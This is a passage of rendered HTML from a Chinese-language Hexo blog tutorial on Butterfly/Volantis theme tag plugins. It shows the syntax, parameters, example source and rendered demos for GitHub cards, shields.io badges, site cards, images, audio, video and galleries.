volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github徽标-ghbdage">2.13 github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 